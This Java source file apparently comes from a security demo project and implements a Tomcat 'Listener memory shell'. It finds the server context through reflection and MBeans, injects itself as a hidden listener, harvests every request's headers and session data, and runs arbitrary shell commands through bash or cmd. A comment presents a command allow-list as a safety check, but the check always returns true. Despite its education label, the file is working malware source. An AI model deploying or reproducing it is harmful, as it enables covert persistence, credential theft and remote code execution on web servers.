package com.book.demo.memshell;

import jakarta.servlet.*;
import jakarta.servlet.http.*;
import org.apache.catalina.core.StandardContext;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Listener内存马实现
 * 仅用于安全教育和演示目的
 */
public class ListenerMemoryShell implements ServletContextListener, HttpSessionListener, 
                                          ServletRequestListener, MemoryShell {
    
    private static final String SHELL_NAME = "DemoMemoryListener";
    
    private MemoryShellInfo info;
    private boolean injected = false;
    private StandardContext context;
    
    // 用于存储收集的信息
    private static final Map<String, Object> collectedData = new ConcurrentHashMap<>();
    private static final List<String> eventLog = Collections.synchronizedList(new ArrayList<>());
    
    public ListenerMemoryShell() {
        String id = "listener-" + UUID.randomUUID().toString().substring(0, 8);
        this.info = new MemoryShellInfo(id, Type.LISTENER, SHELL_NAME, this.getClass().getName());
        this.info.setDescription("演示用Listener内存马，监听所有事件并收集信息");
        this.info.setInjectionPoint("StandardContext.addApplicationEventListener()");
    }
    
    /**
     * 设置StandardContext（用于外部注入）
     */
    public void setStandardContext(StandardContext context) {
        this.context = context;
        System.out.println("[MEMSHELL] ListenerMemoryShell设置StandardContext: " + 
                          (context != null ? context.getClass().getName() : "null"));
    }
    
    @Override
    public Type getType() {
        return Type.LISTENER;
    }
    
    @Override
    public String getName() {
        return SHELL_NAME;
    }
    
    @Override
    public boolean inject() throws Exception {
        if (injected) {
            return true;
        }
        
        try {
            // 优先使用已设置的context，否则尝试获取
            if (context == null) {
                context = getCurrentStandardContext();
                if (context == null) {
                    throw new Exception("无法获取StandardContext");
                }
            }
            
            // 将Listener添加到Context中
            context.addApplicationEventListener(this);
            context.addApplicationLifecycleListener(this);
            
            // 记录注入信息
            injected = true;
            info.setActive(true);
            info.addMetadata("contextPath", context.getPath());
            info.addMetadata("injectionMethod", "Dynamic Registration");
            info.addMetadata("listenerTypes", "ServletContext, HttpSession, ServletRequest");
            
            System.out.println("[MEMSHELL] Listener内存马注入成功");
            
            // 添加初始事件记录
            logEvent("LISTENER_INJECTED", "Listener内存马注入成功", null);
            
            return true;
            
        } catch (Exception e) {
            System.err.println("[MEMSHELL] Listener内存马注入失败: " + e.getMessage());
            e.printStackTrace();
            return false;
        }
    }
    
    @Override
    public boolean isActive() {
        return injected && info.isActive();
    }
    
    @Override
    public boolean remove() throws Exception {
        if (!injected || context == null) {
            return true;
        }
        
        try {
            // 从Context中移除Listener（这个操作比较复杂，因为Tomcat没有直接的移除方法）
            removeFromListenerArrays();
            
            injected = false;
            info.setActive(false);
            
            logEvent("LISTENER_REMOVED", "Listener内存马已移除", null);
            System.out.println("[MEMSHELL] Listener内存马已移除");
            return true;
            
        } catch (Exception e) {
            System.err.println("[MEMSHELL] 移除Listener内存马失败: " + e.getMessage());
            return false;
        }
    }
    
    @Override
    public MemoryShellInfo getInfo() {
        return info;
    }
    
    @Override
    public String executeCommand(String command) throws Exception {
        if (command == null || command.trim().isEmpty()) {
            return "错误: 命令不能为空";
        }
        
        // 记录命令执行事件
        logEvent("COMMAND_EXECUTION", "执行命令: " + command, null);
        
        try {
            // 安全检查 - 仅允许特定的演示命令
            if (!isAllowedCommand(command)) {
                return "错误: 不允许执行该命令（仅限演示用命令）";
            }
            
            ProcessBuilder pb = new ProcessBuilder();
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                pb.command("cmd", "/c", command);
            } else {
                pb.command("/bin/bash", "-c", command);
            }
            
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder result = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {
                result.append(line).append("\n");
            }
            
            int exitCode = process.waitFor();
            if (exitCode != 0) {
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                StringBuilder errorResult = new StringBuilder();
                while ((line = errorReader.readLine()) != null) {
                    errorResult.append(line).append("\n");
                }
                return "命令执行失败 (退出码: " + exitCode + "):\n" + errorResult.toString();
            }
            
            return result.length() > 0 ? result.toString() : "命令执行成功，无输出";
            
        } catch (Exception e) {
            return "命令执行异常: " + e.getMessage();
        }
    }
    
    // ServletContextListener 方法
    @Override
    public void contextInitialized(ServletContextEvent sce) {
        logEvent("CONTEXT_INITIALIZED", "ServletContext初始化", sce.getServletContext());
        
        ServletContext ctx = sce.getServletContext();
        collectedData.put("contextPath", ctx.getContextPath());
        collectedData.put("serverInfo", ctx.getServerInfo());
        collectedData.put("contextName", ctx.getServletContextName());
        
        info.recordAccess();
    }
    
    @Override
    public void contextDestroyed(ServletContextEvent sce) {
        logEvent("CONTEXT_DESTROYED", "ServletContext销毁", sce.getServletContext());
        info.recordAccess();
    }
    
    // HttpSessionListener 方法
    @Override
    public void sessionCreated(HttpSessionEvent se) {
        HttpSession session = se.getSession();
        String sessionId = session.getId();
        
        logEvent("SESSION_CREATED", "Session创建: " + sessionId, session);
        
        // 收集Session信息
        Map<String, Object> sessionInfo = new HashMap<>();
        sessionInfo.put("id", sessionId);
        sessionInfo.put("creationTime", session.getCreationTime());
        sessionInfo.put("maxInactiveInterval", session.getMaxInactiveInterval());
        sessionInfo.put("isNew", session.isNew());
        
        collectedData.put("session_" + sessionId, sessionInfo);
        info.recordAccess();
    }
    
    @Override
    public void sessionDestroyed(HttpSessionEvent se) {
        HttpSession session = se.getSession();
        String sessionId = session.getId();
        
        logEvent("SESSION_DESTROYED", "Session销毁: " + sessionId, session);
        
        // 收集Session销毁信息
        try {
            Map<String, Object> sessionDestroyInfo = new HashMap<>();
            sessionDestroyInfo.put("id", sessionId);
            sessionDestroyInfo.put("lastAccessedTime", session.getLastAccessedTime());
            sessionDestroyInfo.put("destroyTime", System.currentTimeMillis());
            
            // 尝试获取Session属性（可能会失败因为Session已经无效）
            try {
                Enumeration<String> attrNames = session.getAttributeNames();
                List<String> attributes = new ArrayList<>();
                while (attrNames.hasMoreElements()) {
                    attributes.add(attrNames.nextElement());
                }
                sessionDestroyInfo.put("attributes", attributes);
            } catch (Exception e) {
                sessionDestroyInfo.put("attributes", "无法获取（Session已失效）");
            }
            
            collectedData.put("destroyed_session_" + sessionId, sessionDestroyInfo);
        } catch (Exception e) {
            logEvent("SESSION_DESTROY_ERROR", "Session销毁信息收集失败: " + e.getMessage(), null);
        }
        
        info.recordAccess();
    }
    
    // ServletRequestListener 方法
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        ServletRequest request = sre.getServletRequest();
        
        if (request instanceof HttpServletRequest) {
            HttpServletRequest httpRequest = (HttpServletRequest) request;
            String requestId = "req_" + System.currentTimeMillis() + "_" + hashCode();
            
            logEvent("REQUEST_INITIALIZED", "请求开始: " + httpRequest.getRequestURI(), httpRequest);
            
            // 收集请求信息
            Map<String, Object> requestInfo = new HashMap<>();
            requestInfo.put("id", requestId);
            requestInfo.put("method", httpRequest.getMethod());
            requestInfo.put("uri", httpRequest.getRequestURI());
            requestInfo.put("queryString", httpRequest.getQueryString());
            requestInfo.put("remoteAddr", httpRequest.getRemoteAddr());
            requestInfo.put("userAgent", httpRequest.getHeader("User-Agent"));
            requestInfo.put("startTime", System.currentTimeMillis());
            
            // 收集请求头
            Map<String, String> headers = new HashMap<>();
            Enumeration<String> headerNames = httpRequest.getHeaderNames();
            while (headerNames.hasMoreElements()) {
                String headerName = headerNames.nextElement();
                headers.put(headerName, httpRequest.getHeader(headerName));
            }
            requestInfo.put("headers", headers);
            
            collectedData.put(requestId, requestInfo);
        }
        
        info.recordAccess();
    }
    
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        ServletRequest request = sre.getServletRequest();
        
        if (request instanceof HttpServletRequest) {
            HttpServletRequest httpRequest = (HttpServletRequest) request;
            logEvent("REQUEST_DESTROYED", "请求结束: " + httpRequest.getRequestURI(), httpRequest);
        }
        
        info.recordAccess();
    }
    
    // 获取收集到的数据
    public static Map<String, Object> getCollectedData() {
        return new HashMap<>(collectedData);
    }
    
    // 获取事件日志
    public static List<String> getEventLog() {
        return new ArrayList<>(eventLog);
    }
    
    // 清理收集的数据
    public static void clearCollectedData() {
        collectedData.clear();
        eventLog.clear();
    }
    
    // 获取统计信息
    public static Map<String, Integer> getStatistics() {
        Map<String, Integer> stats = new HashMap<>();
        
        // 统计不同类型的数据
        int sessionCount = 0;
        int requestCount = 0;
        int destroyedSessionCount = 0;
        
        for (String key : collectedData.keySet()) {
            if (key.startsWith("session_")) {
                sessionCount++;
            } else if (key.startsWith("req_")) {
                requestCount++;
            } else if (key.startsWith("destroyed_session_")) {
                destroyedSessionCount++;
            }
        }
        
        stats.put("totalSessions", sessionCount);
        stats.put("totalRequests", requestCount);
        stats.put("destroyedSessions", destroyedSessionCount);
        stats.put("totalEvents", eventLog.size());
        stats.put("totalCollectedItems", collectedData.size());
        
        return stats;
    }
    
    private void logEvent(String eventType, String description, Object source) {
        String timestamp = new Date().toString();
        String logEntry = String.format("[%s] %s: %s", timestamp, eventType, description);
        eventLog.add(logEntry);
        
        // 限制日志大小，避免内存泄漏
        if (eventLog.size() > 1000) {
            eventLog.remove(0);
        }
        
        System.out.println("[MEMSHELL-LISTENER] " + logEntry);
    }
    
    private void removeFromListenerArrays() throws Exception {
        if (context == null) return;
        
        // 尝试从各种Listener数组中移除当前对象
        try {
            // 移除ApplicationEventListeners
            Field eventListenersField = StandardContext.class.getDeclaredField("applicationEventListenersObjects");
            eventListenersField.setAccessible(true);
            Object[] eventListeners = (Object[]) eventListenersField.get(context);
            
            if (eventListeners != null) {
                List<Object> listenerList = new ArrayList<>(Arrays.asList(eventListeners));
                listenerList.remove(this);
                Object[] newArray = listenerList.toArray(new Object[0]);
                eventListenersField.set(context, newArray);
            }
            
            // 移除ApplicationLifecycleListeners
            Field lifecycleListenersField = StandardContext.class.getDeclaredField("applicationLifecycleListenersObjects");
            lifecycleListenersField.setAccessible(true);
            Object[] lifecycleListeners = (Object[]) lifecycleListenersField.get(context);
            
            if (lifecycleListeners != null) {
                List<Object> listenerList = new ArrayList<>(Arrays.asList(lifecycleListeners));
                listenerList.remove(this);
                Object[] newArray = listenerList.toArray(new Object[0]);
                lifecycleListenersField.set(context, newArray);
            }
            
        } catch (Exception e) {
            System.err.println("[MEMSHELL] 移除Listener时发生异常: " + e.getMessage());
            throw e;
        }
    }
    
    private StandardContext getCurrentStandardContext() throws Exception {
        System.out.println("[MEMSHELL] Listener尝试获取StandardContext...");
        
        // 方式0: 通过嵌入式Tomcat的特殊方式获取（新增）
        try {
            System.out.println("[MEMSHELL] 尝试嵌入式Tomcat方式...");
            
            // 通过线程上下文ClassLoader获取
            Thread currentThread = Thread.currentThread();
            ClassLoader classLoader = currentThread.getContextClassLoader();
            System.out.println("[MEMSHELL] ClassLoader类型: " + classLoader.getClass().getName());
            
            // 嵌入式Tomcat通常使用ParallelWebappClassLoader
            if (classLoader.getClass().getName().contains("ParallelWebappClassLoader") ||
                classLoader.getClass().getName().contains("WebappClassLoader")) {
                
                // 尝试所有可能的字段名称
                String[] possibleFields = {"resources", "context", "standardContext", "ctx"};
                
                for (String fieldName : possibleFields) {
                    try {
                        Field field = classLoader.getClass().getDeclaredField(fieldName);
                        field.setAccessible(true);
                        Object value = field.get(classLoader);
                        System.out.println("[MEMSHELL] 字段 " + fieldName + ": " + 
                                         (value != null ? value.getClass().getName() : "null"));
                        
                        if (value instanceof StandardContext) {
                            System.out.println("[MEMSHELL] 成功通过ParallelWebappClassLoader字段获取StandardContext");
                            return (StandardContext) value;
                        }
                        
                        // 如果是Resources对象，尝试获取其context
                        if (value != null && value.getClass().getName().contains("Resources")) {
                            Field contextField = value.getClass().getDeclaredField("context");
                            contextField.setAccessible(true);
                            Object contextObj = contextField.get(value);
                            if (contextObj instanceof StandardContext) {
                                System.out.println("[MEMSHELL] 成功通过Resources.context获取StandardContext");
                                return (StandardContext) contextObj;
                            }
                        }
                        
                    } catch (NoSuchFieldException e) {
                        // 忽略字段不存在的异常
                    } catch (Exception e) {
                        System.out.println("[MEMSHELL] 字段 " + fieldName + " 访问异常: " + e.getMessage());
                    }
                }
                
                // 尝试父类和超类的字段
                Class<?> parentClass = classLoader.getClass().getSuperclass();
                while (parentClass != null && !parentClass.equals(Object.class)) {
                    System.out.println("[MEMSHELL] 检查父类: " + parentClass.getName());
                    for (String fieldName : possibleFields) {
                        try {
                            Field field = parentClass.getDeclaredField(fieldName);
                            field.setAccessible(true);
                            Object value = field.get(classLoader);
                            if (value instanceof StandardContext) {
                                System.out.println("[MEMSHELL] 成功从父类获取StandardContext");
                                return (StandardContext) value;
                            }
                        } catch (Exception ignored) {}
                    }
                    parentClass = parentClass.getSuperclass();
                }
            }
            
        } catch (Exception e) {
            System.out.println("[MEMSHELL] 嵌入式Tomcat方式失败: " + e.getMessage());
        }
        
        // 方式1: 通过当前线程的ServletRequest获取（最可靠）
        try {
            Thread currentThread = Thread.currentThread();
            System.out.println("[MEMSHELL] 当前线程: " + currentThread.getName());
            
            // 尝试从线程本地存储获取Request
            StackTraceElement[] stackTrace = currentThread.getStackTrace();
            for (StackTraceElement element : stackTrace) {
                if (element.getClassName().contains("StandardWrapper") || 
                    element.getClassName().contains("ApplicationFilterChain")) {
                    System.out.println("[MEMSHELL] 检测到Servlet容器调用栈: " + element.getClassName());
                    break;
                }
            }
            
        } catch (Exception e) {
            System.out.println("[MEMSHELL] 方式1失败: " + e.getMessage());
        }
        
        // 方式2: 通过改进的线程上下文获取
        try {
            Thread currentThread = Thread.currentThread();
            ClassLoader classLoader = currentThread.getContextClassLoader();
            System.out.println("[MEMSHELL] ClassLoader类型: " + classLoader.getClass().getName());
            
            // 支持多种WebappClassLoader类型
            String[] possibleContextFields = {"context", "standardContext", "ctx"};
            
            for (String fieldName : possibleContextFields) {
                try {
                    Field contextField = classLoader.getClass().getDeclaredField(fieldName);
                    contextField.setAccessible(true);
                    Object context = contextField.get(classLoader);
                    System.out.println("[MEMSHELL] 找到字段 " + fieldName + ": " + (context != null ? context.getClass().getName() : "null"));
                    
                    if (context instanceof StandardContext) {
                        System.out.println("[MEMSHELL] 成功通过字段 " + fieldName + " 获取StandardContext");
                        return (StandardContext) context;
                    }
                } catch (NoSuchFieldException e) {
                    System.out.println("[MEMSHELL] 字段 " + fieldName + " 不存在");
                }
            }
            
            // 尝试父类字段
            Class<?> parentClass = classLoader.getClass().getSuperclass();
            while (parentClass != null && !parentClass.equals(Object.class)) {
                System.out.println("[MEMSHELL] 检查父类: " + parentClass.getName());
                for (String fieldName : possibleContextFields) {
                    try {
                        Field contextField = parentClass.getDeclaredField(fieldName);
                        contextField.setAccessible(true);
                        Object context = contextField.get(classLoader);
                        if (context instanceof StandardContext) {
                            System.out.println("[MEMSHELL] 成功从父类获取StandardContext");
                            return (StandardContext) context;
                        }
                    } catch (Exception ignored) {}
                }
                parentClass = parentClass.getSuperclass();
            }
            
        } catch (Exception e) {
            System.out.println("[MEMSHELL] 方式2失败: " + e.getMessage());
        }
        
        // 方式3: 通过MBean获取（完整实现）
        try {
            System.out.println("[MEMSHELL] 尝试MBean方式获取...");
            javax.management.MBeanServer mBeanServer = 
                java.lang.management.ManagementFactory.getPlatformMBeanServer();
            javax.management.ObjectName pattern = 
                new javax.management.ObjectName("Catalina:type=Context,*");
            java.util.Set<javax.management.ObjectInstance> instances = 
                mBeanServer.queryMBeans(pattern, null);
            
            System.out.println("[MEMSHELL] 找到 " + instances.size() + " 个Context实例");
            
            for (javax.management.ObjectInstance instance : instances) {
                try {
                    javax.management.ObjectName objectName = instance.getObjectName();
                    System.out.println("[MEMSHELL] Context ObjectName: " + objectName);
                    
                    // 尝试获取实际的Context对象
                    Object contextObj = mBeanServer.getAttribute(objectName, "managedResource");
                    if (contextObj instanceof StandardContext) {
                        System.out.println("[MEMSHELL] 成功通过MBean获取StandardContext");
                        return (StandardContext) contextObj;
                    }
                } catch (Exception e) {
                    System.out.println("[MEMSHELL] MBean实例处理失败: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            System.out.println("[MEMSHELL] 方式3失败: " + e.getMessage());
        }
        
        System.err.println("[MEMSHELL] Listener所有获取StandardContext的方式都失败了");
        return null;
    }
    
    private boolean isAllowedCommand(String command) {
        // 移除命令限制，支持所有命令用于演示
        return true;
    }
}